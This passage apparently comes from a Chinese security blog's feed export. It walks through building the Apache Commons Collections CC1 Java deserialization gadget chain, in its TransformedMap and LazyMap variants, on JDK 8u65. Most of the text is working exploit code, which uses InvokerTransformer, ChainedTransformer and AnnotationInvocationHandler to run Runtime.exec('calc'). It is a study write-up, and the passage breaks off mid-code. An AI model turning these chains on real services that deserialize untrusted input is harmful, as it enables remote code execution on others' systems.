class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()<br>        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);<br><br>        serialize(invocationHandler);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231016141036766.png" alt="image-20231016141036766"></p><p>被代理的实例为：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Class</span> c = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor declaredConstructor = c.getDeclaredConstructor(<span class="hljs-keyword">Class</span>.<span class="hljs-keyword">class</span>, Map.<span class="hljs-keyword">class</span>);<br>declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.<span class="hljs-keyword">class</span>, decorateMap);<br></code></pre></td></tr></table></figure><h2 id="利用路径"><a href="#利用路径" class="headerlink" title="利用路径"></a>利用路径</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">InvokeTransformer<span class="hljs-meta">#transform</span><br>LazyMap<span class="hljs-meta">#get</span><br>AnnotationInvocationHandler<span class="hljs-meta">#readObject</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>CC1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化CommonsCollections-CC1链(上)</title>
    <link href="/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8A)/"/>
    <url>/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8A)/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化CommonsCollections-CC1链-上"><a href="#Java反序列化CommonsCollections-CC1链-上" class="headerlink" title="Java反序列化CommonsCollections-CC1链(上)"></a>Java反序列化CommonsCollections-CC1链(上)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先新建一个project，选择maven：</p><p><img src="/2023/04/27/file-upload/20231007171306067.png" alt="image-20231007171306067"></p><p>注意jdk为8u65，高版本无法复现，已修复。下载地址：<a href="https://blog.lupf.cn/category/jdkdl">https://blog.lupf.cn/category/jdkdl</a></p><p>添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>添加之后clean，再install：</p><p><img src="/2023/04/27/file-upload/20231007173651838.png" alt="image-20231007173651838"></p><p>最后load maven changes即可。</p><p>验证是否成功只需要<code>import org.apache.commons.collections.functors.InvokerTransformer;</code>即可：</p><p><img src="/2023/04/27/file-upload/20231007173741551.png" alt="image-20231007173741551"></p><p>不报错就配置完成。</p><p>下载的源码是未开源的，编译器反编译的class会影响调试，因此通过下面的方法查看.java文件。</p><p>到<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%E4%B8%8B%E8%BD%BDzip%E6%96%87%E4%BB%B6%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%90%8E%EF%BC%8C%E5%B0%86jdk-af660750b2f4/src/share/classes/sun%E6%96%87%E4%BB%B6%E5%A4%B9%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E5%A4%8D%E5%88%B6%E5%88%B0jdk8u65%E7%9A%84jdk1.8.0_65/src/sun%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%8D%B3%E5%8F%AF%E3%80%82">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4下载zip文件，解压后，将jdk-af660750b2f4\src\share\classes\sun文件夹的内容，复制到jdk8u65的jdk1.8.0_65\src\sun目录下即可。</a></p><h2 id="CommonsCollections介绍"><a href="#CommonsCollections介绍" class="headerlink" title="CommonsCollections介绍"></a>CommonsCollections介绍</h2><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><p><a href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><ul><li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li></ul><h2 id="TransformMap版CC1攻击链分析"><a href="#TransformMap版CC1攻击链分析" class="headerlink" title="TransformMap版CC1攻击链分析"></a>TransformMap版CC1攻击链分析</h2><p>总体的流程大概如下图所示：</p><p><img src="/2023/04/27/file-upload/g" alt="CC1"></p><p>需要一个readObject方法作为链首，还需要在链子结尾处一个能够执行危害命令的方法，通过一条完整的链子串联起来，接下来一次分析。</p><h3 id="寻找链尾"><a href="#寻找链尾" class="headerlink" title="寻找链尾"></a>寻找链尾</h3><p>直接看到Transformer接口，查看其实现类：</p><p><img src="/2023/04/27/file-upload/20231008155153805.png" alt="image-20231008155153805"></p><p>跟到InvokerTransformer：</p><p><img src="/2023/04/27/file-upload/20231008155324998.png" alt="image-20231008155324998"></p><p>发现存在transform方法，这里通过反射可以调用任意类。</p><p>回顾一下通过反射弹计算器的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结合InvokerTransformer，修改代码，通过transform方法来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        invokerTransformer.transform(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231008155945630.png" alt="image-20231008155945630"></p><p>成功执行命令，这里可以作为尾部的方法。</p><h3 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h3><p>注意到前面是通过transform方法进行反射调用，最终执行了命令，因此往前找调用transform方法的地方。</p><p>跟到TransformedMap中的checkSetValue方法：</p><p><img src="/2023/04/27/file-upload/20231008160413014.png" alt="image-20231008160413014"></p><p>这里<code>return valueTransformer.transform(value)</code>，继续往前跟，找valueTransformer是什么：</p><p><img src="/2023/04/27/file-upload/20231008160538197.png" alt="image-20231008160538197"></p><p>看到这里是TransformedMap的构造方法，不过是protected修饰的，在package之外无法new对象，继续往前找：</p><p><img src="/2023/04/27/file-upload/20231008161624054.png" alt="image-20231008161624054"></p><p>找到一个静态方法decorate，这里return了一个TransformedMap对象，并且该方法是public，到这一步尝试修改一下前面的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        Map&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorete</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">transformedMapClass</span> <span class="hljs-operator">=</span> TransformedMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        method.invoke(decorete,runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231008164512596.png" alt="image-20231008164512596"></p><p>可以看到已经成功执行了命令，接下来对POC进行分析。</p><ul><li>首先要注意的是，执行命令最终依靠的还是InvokerTransformer中的transform方法，不过是将链子往前推了几步。</li><li>transform方法被TransformMap类中的checkSetValue调用，因此利用反射调用该方法，由于是protected，需要setAccessible，这里invode的args即为transform的参数runtime。</li><li>调用checkSetValue的类valueTransformer，即为TransformedMap构造函数中的最后一个参数值，也就是decorate的参数，</li></ul><p>根据前面的分析，到了decorate，这里已经没法再往前找，因此回退到checkSetValue。</p><p>查看引用：</p><p><img src="/2023/04/27/file-upload/20231008171404028.png" alt="image-20231008171404028"></p><p>在抽象类AbstractInputCheckedMapDecorator中的内部类MapEntry中找到了parent.checkSetValue。setValue方法其实是重写了AbstractMapEntryDecorator中的setValue：</p><p><img src="/2023/04/27/file-upload/20231008171658381.png" alt="image-20231008171658381"></p><p>这里的setValue方法又是实现了Map.java中的Entry接口，Entry代表Map中的一个键值对：</p><p><img src="/2023/04/27/file-upload/20231008171815476.png" alt="image-20231008171815476"></p><p>所以到目前，最终找到了Map类中。所以前面的POC中，其实是decorate在遍历Map的时候，走到了setValue，继而调用了checkSetValue方法。</p><p>看下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SetValueTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br>        <span class="hljs-keyword">for</span> (Map.Entry entry: decorate.entrySet())&#123;<br>            entry.setValue(runtime);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先通过对Map遍历，触发setValue方法，具体步骤为：实例化一个Map，put一个键值对，然后通过TransformedMap的decorate方法进行封装，最后遍历。</p><p>这段代码运行后也会执行calc命令。接下来debug看一下流程。</p><p>在decorate下断点：</p><p><img src="/2023/04/27/file-upload/20231009100048010.png" alt="image-20231009100048010"></p><p>这里的valueTransformer是InvokerTransformer，对象，步入：</p><p><img src="/2023/04/27/file-upload/20231009101008395.png" alt="image-20231009101008395"></p><p>到了TransformedMap构造方法。到for循环处，步入：</p><p><img src="/2023/04/27/file-upload/20231009101630262.png" alt="image-20231009101630262"></p><p>跟到抽象类AbstractInputCheckedMapDecorator的checkSetValue方法，value的值就是Runtime对象。</p><p>继续：</p><p><img src="/2023/04/27/file-upload/20231009101740752.png" alt="image-20231009101740752"></p><p>这里到了TransformedMap类里，继续跟进：</p><p><img src="/2023/04/27/file-upload/20231009101828540.png" alt="image-20231009101828540"></p><p>最后到了InvokerTransformer类的transform方法，也就是前面说到的链尾。  </p><p>到这里，问题已经变成，如何通过Map类，最终来执行setValue方法。</p><h3 id="寻找链首"><a href="#寻找链首" class="headerlink" title="寻找链首"></a>寻找链首</h3><p>前面已经找到了setValue，这里继续findusage：</p><p><img src="/2023/04/27/file-upload/20231008173620694.png" alt="image-20231008173620694"></p><p>发现存在一个readObject方法，这也就是要找的入口类。跟进去看看：</p><p><img src="/2023/04/27/file-upload/20231008173744294.png" alt="image-20231008173744294"></p><p>该方法在AnnotationInvocationHandler类中，该类于前面文章提到的动态代理相关，其作用域为默认。并且注意这里要走到memberValue.setValue方法，需要满足if的判断条件。</p><h2 id="TransformMap版CC1手写EXP"><a href="#TransformMap版CC1手写EXP" class="headerlink" title="TransformMap版CC1手写EXP"></a>TransformMap版CC1手写EXP</h2><p>接下来尝试编写完整利用链的EXP。</p><p>首先Runtime无法进行序列化，因为他没有继承Serialize接口：</p><p><img src="/2023/04/27/file-upload/20231009153550294.png" alt="image-20231009153550294"></p><p>但是Class类，也就是他的原型类继承了接口，是可以被序列化的：</p><p><img src="/2023/04/27/file-upload/20231009160027222.png" alt="image-20231009160027222"></p><p>接下来利用反射来获取Runtime对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getruntime</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getruntime.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(r,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>getruntime.invoke(null,null)，这里因为是静态方法，因此第一个参数为null，又因为无参构造，因此第二个参数也是null。</p><p>上面的代码已经可以成功执行命令：</p><p><img src="/2023/04/27/file-upload/20231009160756935.png" alt="image-20231009160756935"></p><p>结合transform方法进行修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getruntime</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getruntime);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231009163047036.png" alt="image-20231009163047036"></p><p>考虑到代码的嵌套问题，这里使用Commons Collections库中的ChainedTransformer类，他同样调用了transform方法：</p><p><img src="/2023/04/27/file-upload/20231009163648296.png" alt="image-20231009163648296"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        Method getruntime = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getruntime);</span><br><span class="hljs-comment">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">         */</span><br>        Transformer[] Transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                